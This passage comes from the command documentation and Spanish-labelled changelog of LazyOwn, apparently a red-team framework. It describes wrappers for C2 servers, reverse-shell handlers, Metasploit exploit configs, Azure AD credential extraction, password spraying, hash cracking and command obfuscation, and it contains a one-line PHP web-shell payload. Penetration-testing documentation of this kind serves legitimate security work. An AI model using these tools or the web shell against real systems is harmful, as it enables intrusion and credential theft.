specific username formats. It then constructs the command for `username-anarchy` 
and executes it.

:param line: is optional you can pass the name and lastname as an argument example: username_anarchy firstname lastname 
:returns: None

## emp3r0r
Command emp3r0r Downloads and sets up the Emperor server for local exploitation.

This function performs the following tasks:
1. Checks if Emperor is already downloaded.
2. Downloads the Emperor tar.xz file if not already present.
3. Extracts the contents into the sessions directory.
4. Executes the Emperor server.
5. Prepares the agent download command based on the OS Host and copies it to the clipboard.

Args:
    line (str): Optional arguments to specify port Relay

Returns:
    None

Example:
    emp3r0r 6666

Notes:
    - Ensure that the required dependencies are installed.

## template_helper_serializer
Handles the creation and serialization of a template helper.

This function performs the following tasks:
1. Retrieves the filename and data to be written from the input line.
2. Initializes a template file and writes the data to it.
3. Serializes the template data and outputs the result.

Args:
    line (str): The input line containing the filename and data in the format "filename, data".

Returns:
    None

Raises:
    None

Example:
    template_helper_serializer shell.php, <?php system($_GET[0]); ?>

## gospherus
Command gospherus: Clones and uses the Gopherus tool to generate gopher payloads for various services.
Use the command template_helper_serializer to generate the serialization payload. more info help template_helper_serializer

This function performs the following tasks:
0. Install Python2 (Old protocol, old t00l, old python)
1. Checks if Gopherus is already cloned in the external/.exploit directory.
2. Clones the Gopherus repository if not already present.
3. Enumerates the possible exploits and prompts the user to choose one.
4. Runs the selected exploit using Gopherus.

Args:
    line (str): Optional argument for specifying the chosen exploit.

Returns:
    None

Example:
    gospherus 2

## wpscan
Command wpscan: Installs and runs WPScan to perform WordPress vulnerability scanning.

This function performs the following tasks:
1. Checks if WPScan is installed.
2. Installs WPScan using gem if not already installed.
3. Prompts the user for a URL to scan.
4. Allows the user to choose additional WPScan options such as --stealthy or --enumerate.
5. Executes the WPScan command with the chosen options.

Args:
    line (str): Optional argument to specify the URL or additional WPScan options.

Returns:
    None

Example:
    wpscan --url blog.tld

## createjsonmachine_batch
Create multiple JSON payload files based on a CSV input file from HackerOne.

This function processes a CSV file located in the 'sessions' directory. The CSV file
must contain information about different assets, including 'identifier', 
'eligible_for_bounty', and 'eligible_for_submission'. For each asset where 
both 'eligible_for_bounty' and 'eligible_for_submission' are set to True, 
a JSON payload file is created using a predefined template.

The CSV must contain the following columns:
- 'identifier': Domain or asset name used to generate the URL and domain for the payload.
- 'eligible_for_bounty': A boolean indicating if the asset is eligible for bounty.
- 'eligible_for_submission': A boolean indicating if the asset is eligible for submission.

For each eligible asset:
- The URL is generated based on the 'identifier' field.
- The domain is derived from the 'identifier' field.
- The 'rhost' field in the JSON payload is updated using the IP address obtained by pinging the domain.

The JSON payload is saved in the format 'payload_<identifier>.json'.

Parameters:
line (str): An optional string parameter. If provided, it selects the corresponding CSV file 
            in the 'sessions' directory based on the user's input.

Returns:
None

## ip2hex
Convert an IPv4 address into its hexadecimal representation.

This function takes an IPv4 address in standard dotted-decimal format 
(e.g., '192.168.1.1') and converts each of its four octets into a hexadecimal 
number. The resulting hexadecimal string is concatenated without separators, 
providing the full hexadecimal equivalent of the IP address.

The input IP address is expected to be a string in the format 'X.X.X.X', 
where X is an integer between 0 and 255.

Parameters:
line (str): The input string representing the IPv4 address in dotted-decimal format.

Returns:
None: The hexadecimal equivalent of the IP address is printed to the console.

## john2keepas
List all .kdbx files in the 'sessions' directory, let the user select one, and run the 
command `sudo keepass2john {user_file} > sessions/hash.txt`. 
If 'sessions/hash.txt' already exists, it will be backed up with a timestamp to avoid overwriting.

Parameters:
line (str): An optional string parameter. This can be used for any additional input, 
            though it's not needed in this specific command.

Returns:
None

## keepass
Open a .kdbx file and print the titles and contents of all entries. The password can be provided through
the 'line' parameter, via user input, or from a 'credentials.txt' file in the 'sessions' directory.

If the file 'credentials.txt' exists in the 'sessions' directory, the first password from it
will be used automatically.

Parameters:
line (str): An optional string parameter to pass the password. If not provided, the user will
            be prompted to input the password.

Returns:
None

## mssqlcli
Attempts to connect to an MSSQL server using the mssqlclient.py tool with Windows authentication.

The function retrieves the necessary parameters (remote host and domain) from the 
instance's parameter dictionary. If a credentials file exists in the 'sessions_dir', 
it reads the file and uses the username/password combinations found there. If the file 
does not exist, it prompts the user for a username and password. 

The password is copied to the clipboard for convenience. A command is constructed using 
the mssqlclient.py tool, and it is then executed to initiate the connection to the MSSQL 
server.

Args:
    line (str): The password input from the command line or an empty string if not provided.

Returns:
    None

## getadusers
Executes the GetADUsers.py script to retrieve Active Directory users.

The function retrieves the necessary parameters (domain controller IP and domain) from the 
instance's parameter dictionary. If a credentials file exists in the 'sessions_dir', 
it reads the file and uses the username/password combinations found there. If the file 
does not exist, it prompts the user for a username and password.

The password is copied to the clipboard for convenience. A command is constructed using 
the GetADUsers.py tool, and it is then executed to enumerate Active Directory users.

Args:
    line (str): The password input from the command line or an empty string if not provided.

Returns:
    None

## crack_cisco_7_password
Crack a Cisco Type 7 password hash and display the plaintext.

This command takes an encrypted Cisco Type 7 password hash as input,
processes it to recover the original plaintext password, and prints the
result to the console.

Args:
    line (str): The encrypted password hash in Cisco Type 7 format.

Returns:
    None: The function prints the plaintext password directly to the console.

## loxs
Command loxs: Installs and runs Loxs for multi-vulnerability web application scanning.

This function performs the following tasks:
1. Checks if Loxs is already cloned in the external/.exploit directory.
2. Clones the Loxs repository if not present.
3. Installs required dependencies.
4. Prompts the user for a URL or file input, custom payload file, success criteria, and thread count.
5. Executes Loxs for scanning vulnerabilities like LFI, OR, XSS, and SQLi.
6. Displays real-time results and optionally saves vulnerable URLs.

Args:
    line (str): Optional argument for specifying the input URL or file, custom payload, and additional options.

Returns:
    None

Example:
    loxs --url target.com

## blazy
Command blazy: Installs and runs blazy for multi-vulnerability web application scanning.

This function performs the following tasks:
1. Checks if blazy is already cloned in the external/.exploit directory.
2. Clones the blazy repository if not present.
3. Installs required dependencies.
4. Prompts the user for a URL or file input, custom payload file, success criteria, and thread count.
5. Executes blazy for Bruteforce Login.
6. Displays real-time results and optionally saves vulnerable URLs.

Args:
    line (str): Optional argument for specifying the input URL.

Returns:
    None

Example:
    python3 main.py -i target.com

## parth
Command parth: Installs and runs Parth for discovering vulnerable URLs and parameters.

This function performs the following tasks:
1. Checks if Parth is already cloned in the external/.exploit directory.
2. Clones the Parth repository if not present.
3. Installs required dependencies using pip3.
4. Prompts the user for a URL, file input, or import option and allows for custom output such as JSON or saving parameter names.
5. Executes Parth for scanning vulnerabilities like LFI, SSRF, SQLi, XSS, and open redirects.
6. Displays real-time results and optionally saves output in a file.

Args:
    line (str): Optional argument for specifying the target domain, import file, or additional Parth options.

Returns:
    None

Example:
    parth -t example.com

## breacher
Command breacher: Installs and runs Breacher for finding admin login pages and EAR vulnerabilities.

This function performs the following tasks:
1. Checks if Breacher is already cloned in the external/.exploit directory.
2. Clones the Breacher repository if not present.
3. Installs required dependencies.
4. Prompts the user for a target URL, file type (php, asp, html), custom paths, and thread options.
5. Executes Breacher for scanning admin login pages and potential EAR vulnerabilities.
6. Supports multi-threading and custom paths for enhanced scanning.

Args:
    line (str): Optional argument for specifying the target URL, file type, and additional Breacher options.

Returns:
    None

Example:
    breacher -u example.com --type php

## xsstrike
Command xsstrike: Installs and runs XSStrike for finding XSS vulnerabilities.

This function performs the following tasks:
1. Checks if XSStrike is already cloned in the external/.exploit directory.
2. Clones the XSStrike repository if not present.
3. Installs required dependencies.
4. Prompts the user for a target URL, crawling level, request method, encoding, and additional XSStrike options.
5. Executes XSStrike for testing vulnerabilities, supporting multiple features like fuzzing, blind XSS injection, crawling, and more.

Args:
    line (str): Optional argument for specifying the target URL, crawling level, encoding, and other XSStrike options.

Returns:
    None

Example:
    xsstrike -u http://example.com/search.php?q=query --crawl -l 3

## penelope
Command penelope: Installs and runs Penelope for handling reverse and bind shells.

This function performs the following tasks:
1. Checks if Penelope is already cloned in the external/.exploit directory.
2. Clones the Penelope repository if not present.
3. Prompts the user for various options to configure and run Penelope.
4. Executes Penelope with the specified options, supporting multiple features like reverse shell, bind shell, file server, etc.

Args:
    line (str): Optional argument for specifying the port and other Penelope options.

Returns:
    None

Example:
    penelope 5555 -i eth0

## h
Open a new window within a tmux session using the LazyOwn RedTeam Framework.

This method is designed to create a new horizontal split window in an existing
tmux session, where the specified command will be executed. The command
used to open the new window is the `./run --no-banner` script, which is
intended for use within the LazyOwn RedTeam Framework environment.

The method first ensures that the specified tmux session is active by calling
the `ensure_tmux_session` function. If the session is not already running,
it will create a new one. After confirming that the session is active, it
proceeds to create a new horizontal window with a specified size. The size of
the new window is currently set to 50% of the available terminal space.

Args:
    arg (str): Additional arguments passed to the command, if any. This can be
                used to customize the behavior of the command executed in the
                new window. However, in the current implementation, this
                argument is not utilized and can be left as an empty string.

Example:
    If this method is called within a command-line interface of the LazyOwn
    RedTeam Framework, it will open a new horizontal tmux window and execute
    the `./run --no-banner` command within it.

Note:
    - Ensure that tmux is installed and properly configured on the system.
    - The method assumes that the session name is defined and accessible in
    the scope where this method is called.

## v
Open a new window within a tmux session using the LazyOwn RedTeam Framework.

This method is designed to create a new vertical split window in an existing
tmux session, where the specified command will be executed. The command
used to open the new window is the `./run --no-banner` script, which is
intended for use within the LazyOwn RedTeam Framework environment.

The method first ensures that the specified tmux session is active by calling
the `ensure_tmux_session` function. If the session is not already running,
it will create a new one. After confirming that the session is active, it
proceeds to create a new vertical window with a specified size. The size of
the new window is currently set to 50% of the available terminal space.

Args:
    arg (str): Additional arguments passed to the command, if any. This can be
                used to customize the behavior of the command executed in the
                new window. However, in the current implementation, this
                argument is not utilized and can be left as an empty string.

Example:
    If this method is called within a command-line interface of the LazyOwn
    RedTeam Framework, it will open a new vertical tmux window and execute
    the `./run --no-banner` command within it.

Note:
    - Ensure that tmux is installed and properly configured on the system.
    - The method assumes that the session name is defined and accessible in
    the scope where this method is called.

## adgetpass
Command adgetpass: Generates a PowerShell script to extract credentials from Azure AD Connect Sync.

This function generates a PowerShell script based on user inputs, including the SQL server,
database, and custom keyset values. The script retrieves encryption keys, decrypts credentials,
and outputs the domain, username, and password from the AD Sync configuration.

Args:
    line (str): Optional argument to specify the server name, database name, and other options
                in the following format: "server_name database_name keyset_id instance_id entropy".

Returns:
    None

Example:
    adgetpass MONTEVERDE ADSync 1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD

## openredirex
Command openredirex: Clones, installs, and runs OpenRedirex for testing open redirection vulnerabilities.

This function performs the following tasks:
1. Clones the OpenRedirex repository if not already cloned.
2. Installs the required dependencies using the setup script.
3. Prompts the user for required inputs like the URL list, payloads file, keyword, and concurrency level.
4. Executes OpenRedirex to scan the provided URLs for open redirection vulnerabilities.

Args:
    line (str): Optional argument for specifying the URL list, payload file, keyword, and concurrency level.

Returns:
    None

Example:
    openredirex list_of_urls.txt payloads.txt FUZZ 50

## feroxbuster
Command feroxbuster: Installs and runs Feroxbuster for performing forced browsing and directory brute-forcing.

This function performs the following tasks:
1. Installs Feroxbuster using a `curl` command if it's not already installed.
2. Prompts the user for required inputs like the target URL, wordlist, file extensions, and additional options.
3. Executes Feroxbuster for directory enumeration and brute-force attacks.

Args:
    line (str): Optional argument for specifying the target URL, wordlist, and other Feroxbuster options.

Returns:
    None

Example:
    feroxbuster -u http://example.com -w wordlist.txt -x php,html

## gowitness
Command gowitness: Installs and runs Gowitness for screenshotting web services or network CIDR blocks.

This function performs the following tasks:
1. Ensures that Gowitness is installed (if not, installs it).
2. Allows the user to select the scan type (single, scan, nmap, report).
3. Based on the scan type, prompts for the appropriate input (URL or XML file).
4. Allows the user to choose additional flags based on the scan type.
5. Executes Gowitness with the chosen parameters.

Args:
    line (str): Optional argument for specifying the URL or scan type.

Returns:
    None

Example:
    gowitness nmap -f scan_results.xml --write-db

## odat
Command odat: Runs the ODAT sidguesser module to guess Oracle SIDs on a target Oracle database.

This function performs the following tasks:
1. Ensures that ODAT is installed (checks if 'odat.py' exists).
2. Allows the user to specify the RHOST and port.
3. Runs ODAT's 'sidguesser' module with the specified parameters.

Args:
    line (str): Optional argument for specifying additional ODAT options.

Returns:
    None

Example:
    odat

## sireprat
Command sireprat: Automates the setup and usage of SirepRAT to perform various attacks on a Windows IoT Core device.

This function performs the following tasks:
1. Installs required dependencies and sets up SirepRAT if not already installed.
2. Prompts the user to select from predefined attacks, including retrieving system information, executing commands, saving registry keys, and copying files.
3. Executes the selected attack on the target device, using the remote host IP stored in self.params["rhost"].

Args:
    line (str): Optional argument for specifying attack type directly.

Returns:
    None

Example:
    sireprat

## createtargets
Generates hosts.txt, urls.txt, domains.txt, and targets.txt from multiple JSON payload files.

This function scans the current directory for all JSON files with the format 'payload_{variable}.json',
and extracts the 'rhost', 'url', 'domain', and 'subdomain' fields from each file. It then writes these values into
four separate text files: 'hosts.txt', 'urls.txt', 'domains.txt', and 'targets.txt'. The 'targets.txt' file contains
the domain and subdomain in the format '{subdomain}.{domain}' and '{subdomain}.{url}', with domains cleaned using
the 'get_domain' function.

Parameters:
line (str): An optional argument (unused in this function).

Returns:
None

## shellcode2sylk
Converts shellcode to SYLK format and saves the result to a file.

This function reads the provided shellcode, or retrieves it from a default
binary source if not supplied. The shellcode is then converted to SYLK 
format and saved in the `sessions/shellcode.sylk` file.

PoC Python code to create a SYLK file with Excel4 shellcode loader.

Author: Stan Hegt (@StanHacked)

Just a proof of concept. Needs polishing before use in actual operations.
Or as Adam Chester would put it: "RWX for this POC, because... yolo"

Background details: https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/

Args:
    line (str): The input shellcode string. If empty or None, the function 
                attempts to load shellcode from a predefined source.

Returns:
    None: The function writes the SYLK shellcode to a file and prints it 
    out, but does not return any value.

Raises:
    FileNotFoundError: If no shellcode is found when trying to load it from 
                    the default source.

## magicrecon
Command magicrecon: Automates the setup and usage of MagicRecon to perform various types of reconnaissance and vulnerability scanning on specified targets.

This function performs the following tasks:
1. Clones and installs MagicRecon if not already installed.
2. Prompts the user to input the target domain, list, or wildcard if not provided.
3. Executes MagicRecon with the specified options for target reconnaissance and vulnerability analysis.
4. Supports notifications through Discord, Telegram, or Slack if configured.

Args:
    line (str): Command-line arguments specifying the target and recon mode. If not provided, the function prompts the user for required inputs.

Returns:
    None

Example:
    magicrecon -d example.com -a

## cubespraying
Command cubespraying: Automates the installation and usage of CubeSpraying for performing credential spraying attacks.

This function performs the following tasks:
1. Clones and installs CubeSpraying if not already installed.
2. Prompts the user for the target URL, username file, password file, and optional parameters like verbosity and timeout.
3. Executes CubeSpraying for credential spraying attacks against the target URL.

Args:
    line (str): Optional argument for specifying the target URL, username file, password file, and additional CubeSpraying options.

Returns:
    None

Example:
    cubespraying --url http://example.com --usernames users.txt --passwords passwords.txt --verbose --timeout 5

## samdump2
Run samdump2 with the SAM and SYSTEM file

:param line: This parameter is not used in the function but can be reserved for future use.

:returns: None

Manual execution:
To manually run `samdump2`, use the following command:

    samdump2 sessions/SYSTEM sessions/SAM

This function prompts the user for domain, username, password, and IP address.

## stormbreaker
Command stormbreaker: Automates the installation and usage of Storm-Breaker for performing various network attacks.

This function performs the following tasks:
1. Clones and installs Storm-Breaker if not already installed.
2. Prompts the user for optional parameters and target configuration.
3. Executes Storm-Breaker to perform various attacks using the target configuration.

Args:
    line (str): Optional argument for specifying additional Storm-Breaker options.

Returns:
    None

Example:
    stormbreaker --verbose

## upload_bypass
Command upload_bypass: Automates the installation and execution of Upload_Bypass for performing file upload bypass tests.

This function performs the following tasks:
1. Clones and installs Upload_Bypass if not already installed.
2. Prompts the user for the type of execution mode (Detection, Exploitation, or Anti-Malware).
3. Prepares and executes the chosen mode based on user input: success message, forbidden extension, upload directory, and proxy settings.

Args:
    line (str): Optional argument for specifying execution mode, request file, success message, forbidden extension, and other Upload_Bypass options.

Returns:
    None

Example:
    upload_bypass --detect --request_file test --success 'File uploaded successfully' --extension php --upload_dir /uploads --burp

## hex_to_plaintext
Converts hexadecimal data from a file to plain text.

Opens a text editor for the user to paste hexadecimal data into a file.
Then reads the file, processes the hexadecimal data, and writes the plain text to a new file.

Args:
    line (str): Name of the file containing hexadecimal data (without extension).
                Defaults to 'request.txt' if not provided.

Returns:
    None

## rpcmap_py
Command rpcmap_py: Executes rpcmap.py commands to enumerate MSRPC interfaces.

This function allows the user to:
1. Run rpcmap.py with a specified string binding to discover MSRPC interfaces.
2. Filter the output using grep for specific DCOM-related interfaces.
3. Optionally run rpcmap.py with additional flags for brute-forcing opnums and adjusting the authentication level.

Args:
    line (str): Optional argument specifying the string binding or additional flags for rpcmap.py.

Returns:
    None

Example:
    rpcmap_py 'ncacn_ip_tcp:10.10.10.213'
    rpcmap_py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5

## serveralive2
Command serveralive2: Uses Impacket to connect to a remote MSRPC interface and retrieves the server bindings.

This function allows the user to:
1. Establish a connection to a remote MSRPC interface using a specified target from self.params["rhost"].
2. Set the authentication level to none.
3. Retrieve and print the network addresses from the server bindings using the IObjectExporter.

Args:
    line (str): Unused in this context. The target is derived from self.params["rhost"].

Returns:
    None

Example:
    serveralive2

## john2zip
List all .zip files in the 'sessions' directory, let the user select one, and run the command 
`zip2john {selected_file} > sessions/hash.txt`. 
Then, run John the Ripper to crack the hash using the RockYou wordlist with multiple forks.

Parameters:
line (str): An optional string parameter. This can be used for any additional input, though 
            it's not needed in this specific command.

Returns:
None

## createusers_and_hashs
Command createusers_and_hashs: Extracts usernames and hashes from a dump file.

This function opens a nano editor for the user to input the contents of a 
file in the format:

    username:UID:LM_HASH:NT_HASH:::

Once the data is entered and saved, the function generates:
1. A file named `usernames_{rhost}.txt` containing all usernames.
2. Individual files named `hash_{username}.txt` for each user, containing 
the user's LM and NT hash in the format `LM_HASH:NT_HASH`.

Args:
    line (str): Unused parameter, kept for consistency.

Returns:
    None

## pykerbrute
Command pykerbrute: Automates the installation and execution of PyKerbrute for bruteforcing Active Directory accounts using Kerberos pre-authentication.

This function performs the following tasks:
1. Clones and installs PyKerbrute if not already installed.
2. Allows the user to choose between the EnumADUser.py and ADPwdSpray.py scripts.
3. Executes the selected script with user-defined parameters, including domain, mode (TCP/UDP), and selected hash or password.

Args:
    line (str): Optional argument for specifying additional parameters for execution, such as domain controller, domain, and attack mode.

Returns:
    None

## reg_py
Run reg.py with specified parameters to query the registry.

:param line: Line input for any additional parameters.

:returns: None

Manual execution:
To manually run `reg.py`, use the following command:

    reg.py -hashes :<hash> <domain>/<username>@<target> query -keyName <registry_key>

This function prompts the user for the hash, domain, username, and registry key if they are not already provided.

## name_the_hash
Identify hash type using nth after retrieving it with get_hash().

:param line: Line input for any additional parameters.

:returns: None

Manual execution:
To manually identify the hash, use the following command:

    nth -t "{hash}"

This function fetches the hash using get_hash() and identifies its type. If nth is not installed, it is automatically installed.

## refill_password
Generate a list of possible passwords by filling each asterisk in the input with user-specified characters.

:param line: A string containing asterisks (e.g., WebAO***7) for generating variations.

:returns: None

Process:
Prompts the user to enter characters to replace each asterisk, creates all possible combinations,
and saves them to 'sessions/passwords_refilled.txt'. If this file exists, the previous version is
renamed with a timestamp suffix.

## find_tgts
Finds and returns a list of target hosts with port 445 open in the specified subnet.

Args:
    subnet (str): The subnet to scan, e.g., '192.168.1.0/24'.

Returns:
    list: A list of IP addresses where port 445 is open.

## setup_handler
Sets up a Metasploit multi/handler configuration in the given config file.

Args:
    config_file (file-like object): The file object to write the Metasploit handler configuration to.
    lhost (str): The local host IP address to listen for incoming connections.
    lport (int): The local port number to listen for incoming connections.

Writes:
    - Exploit configuration for Metasploit to the provided file.

## conficker_exploit
Configures and writes a Metasploit exploit for the Conficker vulnerability to the given config file.

Args:
    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
    host (str): The target host IP address to exploit.
    lhost (str): The local host IP address to listen for incoming connections.
    lport (int): The local port number to listen for incoming connections.

Writes:
    - Exploit configuration for the Conficker vulnerability (MS08-067) to the provided file.

## smb_brute
Configures and writes a Metasploit SMB brute force exploit for the given host to the provided config file.

Args:
    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
    host (str): The target host IP address to exploit.
    passwd_file (str): Path to a file containing a list of passwords to use for brute force.
    lhost (str): The local host IP address to listen for incoming connections.
    lport (int): The local port number to listen for incoming connections.

Writes:
    - Exploit configuration for SMB brute force (using the psexec module) to the provided file for each password in the passwd_file.

## setup_handler
Sets up a Metasploit multi/handler exploit configuration in the provided config file.

Args:
    config_file (file-like object): The file object to write the Metasploit handler configuration to.
    lhost (str): The local host IP address to listen for incoming connections.
    lport (int): The local port number to listen for incoming connections.

Writes:
    - Configuration commands to the file to set up the Metasploit handler with the specified payload and options.
    - The payload used is `php/meterpreter/reverse_tcp`.
    - The handler is configured to listen on the provided LHOST and LPORT.
    - Starts the exploit with the `-j -z` options.

## cacti_exploit
Configures an exploit for the Cacti Package Import Remote Code Execution vulnerability in the provided config file.

Args:
    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
    host (str): The target host IP address where the Cacti service is running.

Writes:
    - Configuration commands to the file to set up the Metasploit exploit for the Cacti Package Import RCE.
    - Sets the RHOST to the target host IP.
    - Sets the payload options including the LHOST, USERNAME, and PASSWORD.
    - Starts the exploit with the `-j -z` options.

## single_combo
Generates single character combinations with the target name.

:param name: Target name to use in the combinations.
:param characters: List of characters to combine with the target name.
:param file: File object to write the combinations to.
:param total: Running total of passwords generated.
:param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

:returns: Updated total of passwords generated.

## double_combo
Generates double character combinations with the target name.

:param name: Target name to use in the combinations.
:param characters: List of characters to combine with the target name.
:param file: File object to write the combinations to.
:param total: Running total of passwords generated.
:param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

:returns: Updated total of passwords generated.

## triple_combo
Generates triple character combinations with the target name.

:param name: Target name to use in the combinations.
:param characters: List of characters to combine with the target name.
:param file: File object to write the combinations to.
:param total: Running total of passwords generated.
:param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

:returns: Updated total of passwords generated.

## fourth_combo
Generates fourth character combinations with the target name.

:param name: Target name to use in the combinations.
:param characters: List of characters to combine with the target name.
:param file: File object to write the combinations to.
:param total: Running total of passwords generated.
:param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

:returns: Updated total of passwords generated.

## fifth_combo
Generates fifth character combinations with the target name.

:param name: Target name to use in the combinations.
:param characters: List of characters to combine with the target name.
:param file: File object to write the combinations to.
:param total: Running total of passwords generated.
:param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

:returns: Updated total of passwords generated.

## sixth_combo
Generates sixth character combinations with the target name, adding uppercase characters.

:param name: Target name to use in the combinations.
:param characters: List of characters to combine with the target name.
:param file: File object to write the combinations to.
:param total: Running total of passwords generated.
:param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

:returns: Updated total of passwords generated.

## intercalate_combo
Generates combinations of the target name and character list, intercalating uppercase and lowercase characters.

This function generates combinations where each character in the string alternates between uppercase and 
lowercase. It also allows for the addition of the target name at the beginning or the end of the string.

:param name: Target name to use in the combinations.
:param characters: List of characters to intercalate with the target name.
:param file: File object to write the combinations to.
:param total: Running total of passwords generated.
:param flag: If True, generate combinations with the target name at both the beginning and the end of the string.

:returns: Updated total of passwords generated.

## expand_regex
Expands a regular expression into a list of characters.

:param regex: Regular expression string to expand.
:returns: List of characters matching the regular expression.

## install_netexec
No description available.

## install_netexec_pipx
No description available.

## double_base64_encode
Perform double Base64 encoding on the given command.

This helper function takes a command string, encodes it in Base64, and then performs
another Base64 encoding on the result. The final encoded string is returned.

Args:
    cmd (str): The command string to be encoded.

Returns:
    str: The double Base64 encoded string.

Example:
    >>> double_base64_encode("example")
    'ZWN4YW5hbWVsZQ=='

Notes:
    - The function first encodes the command string into bytes using UTF-8 encoding.
    - It then applies Base64 encoding twice and removes any leading or trailing whitespace.
    - The result is decoded back to a string and returned.

Raises:
    TypeError: If the input `cmd` is not a string.

## apply_obfuscations
Generate a list of obfuscated commands based on the given input command.

This function creates various obfuscated versions of the provided command string.
Each obfuscation method applies a different technique to disguise the command, 
making it less recognizable to simple static analysis.

Args:
    cmd (str): The command string to be obfuscated.

Returns:
    list of str: A list of obfuscated command strings.

Notes:
    - Each obfuscation method aims to transform the command in a unique way.
    - Obfuscations include encoding, character replacement, and command substitution techniques.
    - Ensure that the `double_base64_encode` function is defined and available in the scope where this function is used.

Raises:
    TypeError: If the input `cmd` is not a string.

## alternate_case
Helper function to alternate the case of characters in a string.

<!-- END COMMANDS -->

<!-- START CHANGELOG -->

# Changelog


### Nuevas características

### Otros

  *   * feat(feat): rpcmap_py, serveralive2, john2zip, createusers_and_hashs, pykerbrute, reg_py \n\n Version: vvvrelease/0.2.6 \n\n All documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 24 02:01:08 2024 -0300 \n\n Hora: 1729746068


### Nuevas características

### Otros

  *   * feat(fix): fix \n\n Version: vvvrelease/0.2.5 \n\n fix \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 24 01:59:38 2024 -0300 \n\n Hora: 1729745978


### Pruebas

### Otros

  *   * test(test): test \n\n Version: vvvrelease/0.2.4 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 24 01:58:37 2024 -0300 \n\n Hora: 1729745917


### Refactorización

### Otros

  *   * refactor(refactor): refactor and new features \n\n Version: vvvrelease/0.2.4 \n\n hex_to_plaintext, upload_bypass, stormbreaker \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/lazyseo.py - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 23 01:51:19 2024 -0300 \n\n Hora: 1729659079


### Nuevas características

### Otros

  *   * feat(feat): samdump2 \n\n Version: vvvrelease/0.2.4 \n\n new command docummented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 22 22:52:13 2024 -0300 \n\n Hora: 1729648333


### Nuevas características

### Otros

  *   * feat(feat): cubespraying & magicrecon \n\n Version: vvvrelease/0.2.3 \n\n all documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/win/enablewebpowershell.bat - sessions/win/enablewebpowershell.ps1 - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 22 00:53:07 2024 -0300 \n\n Hora: 1729569187


### Nuevas características

### Otros

  *   * feat(feat): shellcode2sylk \n\n Version: vvvrelease/0.2.2 \n\n and little fix in venom \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 23:54:22 2024 -0300 \n\n Hora: 1729565662


### Refactorización

### Otros

  *   * refactor(refactor): new payloads in winbase64payloads \n\n Version: vvvrelease/0.2.1 \n\n with love to sec communy of LazyOwn \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 23:07:12 2024 -0300 \n\n Hora: 1729562832


### Correcciones

### Otros

  *   * fix(fix): add cmd2 to install.sh \n\n Version: vvvrelease/0.2.1 \n\n bug fixing \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - install.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:58:59 2024 -0300 \n\n Hora: 1729562339


### Nuevo parche

### Otros

  *   * patch(t): t \n\n Version: vvvrelease/0.2.0 \n\n t \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:58:32 2024 -0300 \n\n Hora: 1729562312


### Nuevas características

### Otros

